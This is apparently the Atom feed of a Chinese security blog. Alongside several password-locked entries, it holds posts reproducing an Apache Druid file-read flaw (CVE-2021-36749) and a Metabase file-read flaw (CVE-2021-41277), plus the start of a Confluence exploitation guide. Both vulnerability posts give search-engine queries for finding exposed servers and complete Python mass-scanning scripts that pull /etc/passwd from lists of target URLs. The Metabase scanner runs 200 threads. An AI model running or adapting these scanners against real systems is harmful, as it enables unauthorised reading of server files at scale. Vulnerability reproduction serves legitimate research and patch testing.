<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>忆时光</title>
  
  <subtitle>忆时光</subtitle>
  <link href="http://lvpsectime.github.io/atom.xml" rel="self"/>
  
  <link href="http://lvpsectime.github.io/"/>
  <updated>2020-07-11T04:12:30.252Z</updated>
  <id>http://lvpsectime.github.io/</id>
  
  <author>
    <name>ca5tle</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>日志</title>
    <link href="http://lvpsectime.github.io/post/32353.html"/>
    <id>http://lvpsectime.github.io/post/32353.html</id>
    <published>2099-12-31T16:00:00.000Z</published>
    <updated>2020-07-11T04:12:30.252Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="dd149b59167834316f5d96ad27cb5909771fe1db9fa0372426db74a433337cd0"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码，查看文章！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码，查看文章！</summary>
    
    
    
    <category term="日志" scheme="http://lvpsectime.github.io/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://lvpsectime.github.io/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>日常记录</title>
    <link href="http://lvpsectime.github.io/post/42951.html"/>
    <id>http://lvpsectime.github.io/post/42951.html</id>
    <published>2099-12-31T15:59:59.000Z</published>
    <updated>2020-05-13T10:20:55.193Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7df5b8465111e41a59a7884c759ee30040c27f13240aa4832a50e3d9fefdd4f2">94818f561542136a5f12a1f20ba90f292bf3a19ace642ed5d0b7a732ee6f356291acce8d765a8c51aa6403fac6065f2195c68e3ae23a722d61230070b29d8eff9b0761a0090e209ce54bc36e46778aa9dd3c3e47871c650a19088ddc5d156410a10a6f99ddd9ad8b30d5c084268046a64621dd7b65211d4393c7ddfdf06fdd078bf81dad5fe75f051095af30252f56785c36f1e7b4cbac193433d9e4d71910a3e843d7870199e56b7159e10a7bc4ca7ff4bbc4d750b03224c5702a3147243ba1fa3e0297c94e3948bc75fc75bb4c5932dfa23cd3ed31fdef559b7befc857c375</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码，查看文章！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码，查看文章！</summary>
    
    
    
    <category term="总结" scheme="http://lvpsectime.github.io/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="备忘录" scheme="http://lvpsectime.github.io/tags/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>易错知识</title>
    <link href="http://lvpsectime.github.io/post/34260.html"/>
    <id>http://lvpsectime.github.io/post/34260.html</id>
    <published>2099-12-31T15:59:59.000Z</published>
    <updated>2020-04-25T03:09:14.921Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="06053897d46f2797eddfaba62c70d810ed7cb9afc21e75cb7356dae6f181cd97">94818f561542136a5f12a1f20ba90f2919a48bd43004e11595d49f1293aa0322</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码，查看文章！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码，查看文章！</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Apache Druid 任意文件读取漏洞(CVE-2021-36749)</title>
    <link href="http://lvpsectime.github.io/post/f23775cf.html"/>
    <id>http://lvpsectime.github.io/post/f23775cf.html</id>
    <published>2021-12-06T13:58:15.000Z</published>
    <updated>2021-12-15T14:48:13.098Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Apache Druid 是一个分布式的、支持实时多维 OLAP 分析的数据处理系统。它既支持高速的数据实时摄入处理，也支持实时且灵活的多维数据分析查询。因此 Druid 最常用的场景就是大数据背景下、灵活快速的多维 OLAP 分析。Druid 还支持根据时间戳对数据进行预聚合摄入和聚合分析，因此也有用户经常在有时序数据处理分析的场景中使用。</p><p>该漏洞是由于用户指定 HTTP InputSource 没有做出限制，可以通过将文件 URL 传递给 HTTP InputSource 来绕过应用程序级别的限制。攻击者可利用该漏洞在未授权情况下，构造恶意请求执行文件读取，最终造成服务器敏感性信息泄露。</p><h2 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Druid &lt; 0.22.0</span><br></pre></td></tr></table></figure><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p>点击”Load data”</p><p><img src="/post/f23775cf/image-20211206220115839.png" alt="image-20211206220115839"></p><p>点击”http(s)://“，再点击”Connect data”</p><p><img src="/post/f23775cf/image-20211206220229598.png" alt="image-20211206220229598"></p><p>利用<code>file://</code>协议进行读取</p><p><img src="/post/f23775cf/image-20211206220358096.png" alt="image-20211206220358096"></p><p>成功读取到<code>/etc/passwd</code></p><p><img src="/post/f23775cf/image-20211206220522968.png" alt="image-20211206220522968"></p><h2 id="0x03-漏洞批量"><a href="#0x03-漏洞批量" class="headerlink" title="0x03 漏洞批量"></a>0x03 漏洞批量</h2><p>fofa语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=&quot;Apache Druid&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"># import threadpool</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def verify(urls):</span><br><span class="line">    url = urls + &#x27;/druid/indexer/v1/sampler?for=connect&#x27;</span><br><span class="line">    print(url)</span><br><span class="line">    headers = &#123;&quot;User-Agent&quot;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36&#x27;&#125;</span><br><span class="line">    data = &#123;&quot;type&quot;: &quot;index&quot;, &quot;spec&quot;: &#123;&quot;type&quot;: &quot;index&quot;, &quot;ioConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;, &quot;firehose&quot;: &#123;&quot;type&quot;: &quot;http&quot;, &quot;uris&quot;: [&quot;file:///etc/passwd&quot;]&#125;&#125;, &quot;dataSchema&quot;: &#123;&quot;dataSource&quot;: &quot;sample&quot;, &quot;parser&quot;: &#123;&quot;type&quot;: &quot;string&quot;, &quot;parseSpec&quot;: &#123;&quot;format&quot;: &quot;regex&quot;, &quot;pattern&quot;: &quot;(.*)&quot;, &quot;columns&quot;: [&quot;a&quot;], &quot;dimensionsSpec&quot;: &#123;&#125;, &quot;timestampSpec&quot;: &#123;&quot;column&quot;: &quot;!!!_no_such_column_!!!&quot;, &quot;missingValue&quot;: &quot;2010-01-01T00:00:00Z&quot;&#125;&#125;&#125;&#125;&#125;, &quot;samplerConfig&quot;: &#123;&quot;numRows&quot;: 500, &quot;timeoutMs&quot;: 15000&#125;&#125;</span><br><span class="line">    try:</span><br><span class="line">        res = requests.post(url, headers=headers, json=data, timeout=10, verify=False, allow_redirects=False)</span><br><span class="line">        # print(res.text)</span><br><span class="line">        if &#x27;root&#x27; in res.text:</span><br><span class="line">            info = &#x27;[+] 存在CVE-2021-36749漏洞: &#x27; + urls</span><br><span class="line">            print(info)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_url():</span><br><span class="line">    with open(&#x27;urls.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f:</span><br><span class="line">        urls = f.readlines()</span><br><span class="line">    urls = [url.strip() for url in urls if url and url.strip()]</span><br><span class="line">    return urls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    urls = get_url()</span><br><span class="line">    for url in urls:</span><br><span class="line">        verify(url)</span><br><span class="line">    # pool = threadpool.ThreadPool(50)</span><br><span class="line">    # res = threadpool.makeRequests(verify, url)</span><br><span class="line">    # [pool.putRequest(req) for req in res]</span><br><span class="line">    # pool.wait()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Apache Druid 是一个分布式的、支持实时多维 OLAP 分析的数据处理系统。它既支持高速的</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://lvpsectime.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Metabase敏感信息泄露漏洞(CVE-2021-41277)</title>
    <link href="http://lvpsectime.github.io/post/ff38c33a.html"/>
    <id>http://lvpsectime.github.io/post/ff38c33a.html</id>
    <published>2021-11-24T13:15:26.000Z</published>
    <updated>2021-11-24T13:57:42.845Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>metabase 是一个简单、开源的数据分析平台。自定义 GeoJSON 地图（admin-&gt;settings-&gt;maps-&gt;custom maps-&gt;add a map）操作缺少权限验证，攻击者可通过该漏洞获得敏感信息。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">metabase version &lt; 0.40.5</span><br><span class="line">metabase version &gt;= 1.0.0, &lt; 1.40.5</span><br></pre></td></tr></table></figure><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 3000:3000 --name metabase metabase/metabase:v0.40.4</span><br></pre></td></tr></table></figure><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><img src="/post/ff38c33a/image-20211124214421303.png" alt="image-20211124214421303"></p><p>抓包改包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /api/geojson?url=file:/etc/passwd HTTP/1.1</span><br><span class="line">Host: 10.108.2.145:3000</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: metabase.DEVICE=88a28499-7452-4869-bdc9-1c0f69fbf801; _ga=GA1.1.1715384566.1637761316; _gid=GA1.1.1734076727.1637761316</span><br><span class="line">If-Modified-Since: Wed, 24 Nov 2021 13:48:22 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="/post/ff38c33a/image-20211124215235702.png" alt="image-20211124215235702"></p><h2 id="0x04-批量"><a href="#0x04-批量" class="headerlink" title="0x04 批量"></a>0x04 批量</h2><p>FOFA查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app=&quot;metabase&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import threadpool</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">def verify(urls):</span><br><span class="line">    url = urls + &#x27;/api/geojson?url=file:/etc/passwd&#x27;</span><br><span class="line">    headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36&quot;&#125;</span><br><span class="line">    try:</span><br><span class="line">        res = requests.get(url, headers=headers, timeout=10, verify=False, allow_redirects=False)</span><br><span class="line">        if &#x27;root&#x27; in res.text:</span><br><span class="line">            info = &quot;[+] 存在CVE-2021-36749漏洞: &quot; + urls</span><br><span class="line">            save_vuln(info)</span><br><span class="line">            print(info)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        # print(e)</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def save_vuln(info):</span><br><span class="line">    vuln = info + &#x27;\n&#x27;</span><br><span class="line">    with open(&quot;vuln.txt&quot;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as ff:</span><br><span class="line">        ff.write(vuln)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_file_url():</span><br><span class="line">    with open(&quot;url.txt&quot;, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f:</span><br><span class="line">        _urls = f.readlines()</span><br><span class="line">    urls = [url.strip() for url in _urls if url and url.strip()]</span><br><span class="line">    return urls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    url = get_file_url()</span><br><span class="line">    pool = threadpool.ThreadPool(200)</span><br><span class="line">    res = threadpool.makeRequests(verify, url)</span><br><span class="line">    [pool.putRequest(req) for req in res]</span><br><span class="line">    pool.wait()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;metabase 是一个简单、开源的数据分析平台。自定义 GeoJSON 地图（admin-&amp;gt;</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://lvpsectime.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Confluence利用指南</title>
    <link href="http://lvpsectime.github.io/post/92f83c15.html"/>
    <id>http://lvpsectime.github.io/post/92f83c15.html</id>
    <published>2021-11-16T12:02:17.000Z</published>
    <updated>2021-11-16T14:21:17.405Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Confluence是一个专业的企业知识管理与协同软件，也可以用于构建企业wiki。</p><p>前不久爆出了漏洞<a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html">CVE-2021-26084 - Confluence Server Webwork OGNL injection</a>，本文仅在技术研究的角度介绍Confluence的相关知识。</p><h2 id="0x01-confluence环境搭建"><a href="#0x01-confluence环境搭建" class="headerlink" title="0x01 confluence环境搭建"></a>0x01 confluence环境搭建</h2><p>环境搭建的参考资料：</p><p>Windows:</p><p><a href="https://confluence.atlassian.com/doc/installing-confluence-on-windows-255362047.html">https://confluence.atlassian.com/doc/installing-confluence-on-windows-255362047.html</a></p><p>Linux:</p><p><a href="https://confluence.atlassian.com/doc/installing-confluence-on-linux-143556824.html">https://confluence.atlassian.com/doc/installing-confluence-on-linux-143556824.html</a></p><p>本文以Centos7搭建Confluence为例进行介绍。</p><p>1.配置数据库</p><p>这里选择PostgreSQL，安装的参考资料：</p><p><a href="https://confluence.atlassian.com/doc/database-setup-for-postgresql-173244522.html">https://confluence.atlassian.com/doc/database-setup-for-postgresql-173244522.html</a></p><p><strong>(1)安装PostgreSQL</strong></p><p>访问地址：<a href="https://www.postgresql.org/download/linux/redhat/">https://www.postgresql.org/download/linux/redhat/</a></p><p>获得安装命令，如下图</p><p><img src="/post/92f83c15/image-20211116201453205.png"></p><p>复制一下安装命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y https://download.postgresql.org/pub/repos/yum/reporpms/EL-7-x86_64/pgdg-redhat-repo-latest.noarch.rpm</span><br><span class="line">sudo yum install -y postgresql13-server</span><br><span class="line">sudo /usr/pgsql-13/bin/postgresql-13-setup initdb</span><br><span class="line">sudo systemctl enable postgresql-13</span><br><span class="line">sudo systemctl start postgresql-13</span><br></pre></td></tr></table></figure><p>安装完成后查看运行状态：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status postgresql-13</span><br></pre></td></tr></table></figure><p><img src="/post/92f83c15/image-20211116202733790.png"></p><p><strong>(2)配置PostgreSQL</strong></p><p>设置允许其他程序访问数据库：</p><p>修改<code>/var/lib/pgsql/13/data/pg_hba.conf</code>，把<code>METHOD</code>改为<code>trust</code>，设置如下图</p><p><img src="/post/92f83c15/image-20211116202917914.png" alt="image-20211116202917914"></p><p>重启PostgreSQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart postgresql-13</span><br></pre></td></tr></table></figure><p>补充：配置允许其他IP访问数据库</p><p>修改<code>/var/lib/pgsql/13/data/pg_hba.conf</code>，将<code>ADDRESS</code>改为<code>0.0.0.0/0</code>，如下图</p><p><img src="/post/92f83c15/image-20211116203014880.png" alt="image-20211116203014880"></p><p>修改<code>/var/lib/pgsql/13/data/postgresql.conf</code></p><p>设置<code>listen_addresses = &#39;*&#39;</code>，如下图</p><p><img src="/post/92f83c15/image-20211116203121043.png" alt="image-20211116203121043"></p><p>重启PostgreSQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart postgresql-13</span><br></pre></td></tr></table></figure><p><strong>(3)数据库操作</strong></p><p>PostgreSQL安装完成后会在本地操作系统创建一个名为<code>postgres</code>的用户，默认没有口令</p><p>切换到用户<code>postgres</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su postgres</span><br></pre></td></tr></table></figure><p>进入postgreSQL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash-4.2$ psql</span><br></pre></td></tr></table></figure><p>设置用户postgres的密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postgres=# \password postgres</span><br></pre></td></tr></table></figure><p><img src="/post/92f83c15/image-20211116203457978.png" alt="image-20211116203457978"></p><p>查看创建用户的命令说明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postgres=# \h create user</span><br></pre></td></tr></table></figure><p><img src="/post/92f83c15/image-20211116203636733.png" alt="image-20211116203636733"></p><p>创建用户confluence：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">postgres=# create user confluence with password &#x27;confluence&#x27; createdb login;</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">createdb: 具有创建数据库的权限</span><br><span class="line">login: 具有登录权限</span><br></pre></td></tr></table></figure><p>创建数据库confluence：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">postgres=# create database confluence with owner=confluence encoding=&#x27;UTF8&#x27;;</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">encoding: 指定encoding必须为utf8</span><br></pre></td></tr></table></figure><p>测试用户登录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@wiki ~]# psql -h localhost -p 5432 -d confluence -U confluence</span><br></pre></td></tr></table></figure><p><img src="/post/92f83c15/image-20211116204228723.png" alt="image-20211116204228723"></p><p><strong>2.安装Confluence</strong></p><p>下载地址：<a href="https://www.atlassian.com/software/confluence/download-archives">https://www.atlassian.com/software/confluence/download-archives</a></p><p>选择一个版本7.11.3</p><p>下载时选择<code>7.11.3 - Linux Installer (64 bit)</code>，如下图</p><p><img src="/post/92f83c15/image-20211116204441501.png" alt="image-20211116204441501"></p><p><img src="/post/92f83c15/image-20211116204356983.png" alt="image-20211116204356983"></p><p>执行安装命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@wiki ~]# ls</span><br><span class="line">atlassian-confluence-7.11.3-x64.bin  check.py</span><br><span class="line">[root@wiki ~]# chmod +x atlassian-confluence-7.11.3-x64.bin </span><br><span class="line">[root@wiki ~]# ./atlassian-confluence-7.11.3-x64.bin </span><br></pre></td></tr></table></figure><p><img src="/post/92f83c15/image-20211116205448654.png" alt="image-20211116205448654"></p><p>在安装过程中，按下图操作</p><p><img src="/post/92f83c15/image-20211116210307690.png" alt="image-20211116210307690"></p><p>安装结束后，使用浏览器访问<a href="http://ip:8090/">http://IP:8090</a></p><p><img src="/post/92f83c15/image-20211116211413169.png" alt="image-20211116211413169"></p><p>在设置Confluence页面，需要填入license，可以通过访问<a href="https://my.atlassian.com/license/evaluation%E8%8E%B7%E5%BE%97%EF%BC%8C%E5%A6%82%E4%B8%8B%E5%9B%BE">https://my.atlassian.com/license/evaluation获得，如下图</a></p><p><img src="/post/92f83c15/image-20211116211452423.png" alt="image-20211116211452423"></p><p><img src="/post/92f83c15/image-20211116211528778.png" alt="image-20211116211528778"></p><p>填入license</p><p><img src="/post/92f83c15/image-20211116211622138.png" alt="image-20211116211622138"></p><p>next</p><p><img src="/post/92f83c15/image-20211116211647952.png" alt="image-20211116211647952"></p><p>配置数据库信息，测试连接</p><p><img src="/post/92f83c15/image-20211116211808981.png" alt="image-20211116211808981"></p><p>接下来，依次设置content、manage users和administrator account页面（每个页面随便选一个就行）</p><p><img src="/post/92f83c15/image-20211116212409673.png" alt="image-20211116212409673"></p><p><img src="/post/92f83c15/image-20211116212510922.png" alt="image-20211116212510922"></p><p><img src="/post/92f83c15/image-20211116212617346.png" alt="image-20211116212617346"></p><p>最后的成功页面如下图</p><p><img src="/post/92f83c15/image-20211116212852286.png" alt="image-20211116212852286"></p><p>访问登录页面：<a href="http://ip:8090/welcome.action%EF%BC%8C%E5%A6%82%E4%B8%8B%E5%9B%BE">http://IP:8090/welcome.action，如下图</a></p><p><img src="/post/92f83c15/image-20211116212954728.png" alt="image-20211116212954728"></p><p><strong>3.创建Confluence普通用户</strong></p><p>使用管理员帐户登录后，选择<code>用户管理</code>进行用户配置，如下图</p><p><img src="/post/92f83c15/image-20211116213315707.png" alt="image-20211116213315707"></p><p>添加用户test1，配置如下图</p><p><img src="/post/92f83c15/image-20211116213432321.png" alt="image-20211116213432321"></p><p>注意：管理员账号对应以下两个组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">confluence-administrators</span><br><span class="line">confluence-users</span><br></pre></td></tr></table></figure><p>添加用户后，可访问<a href="http://localhost:8090/%E8%BF%9B%E8%A1%8C%E7%99%BB%E5%BD%95%E3%80%82">http://localhost:8090/进行登录。</a></p><h2 id="0x02-基础知识"><a href="#0x02-基础知识" class="headerlink" title="0x02 基础知识"></a>0x02 基础知识</h2><p><strong>1.文件目录</strong></p><p>参考资料：</p><p><a href="https://www.cwiki.us/display/CONF6ZH/Confluence+Home+and+other+important+directories">https://www.cwiki.us/display/CONF6ZH/Confluence+Home+and+other+important+directories</a></p><p>(1)<code>&lt;confluence-installation&gt;</code></p><p>安装目录，用于存储系统文件</p><p>默认安装位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows: C:/Program Files/Atlassian/Confluence/</span><br><span class="line">Linux: /opt/atlassian/confluence/</span><br></pre></td></tr></table></figure><p>(2)<code>&lt;confluence-home&gt;</code></p><p>数据目录，用于存储数据</p><p>默认安装位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows: C:/Program Files/Atlassian/Application Data/Confluence/</span><br><span class="line">Linux: /var/atlassian/application-data/confluence/</span><br></pre></td></tr></table></figure><p>(3)二者之间的联系</p><p><code>&lt;confluence-installation&gt;/confluence/WEB-INF/classes/confluence-init.properties</code>文件中定义了<code>&lt;confluence-home&gt;</code>的位置</p><p>2.数据库信息</p><p>存储数据库配置信息的位置： <code>&lt;confluence-home&gt;/confluence.cfg.xml</code></p><p>3.用户信息</p><p>用户信息位于Confluence的数据库中</p><p>存储用户信息的表：<code>CWD_USER</code>，具体列名称如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user_name:用户名</span><br><span class="line">active:是否启用</span><br><span class="line">email_address:邮件地址</span><br><span class="line">credential:用户凭据</span><br><span 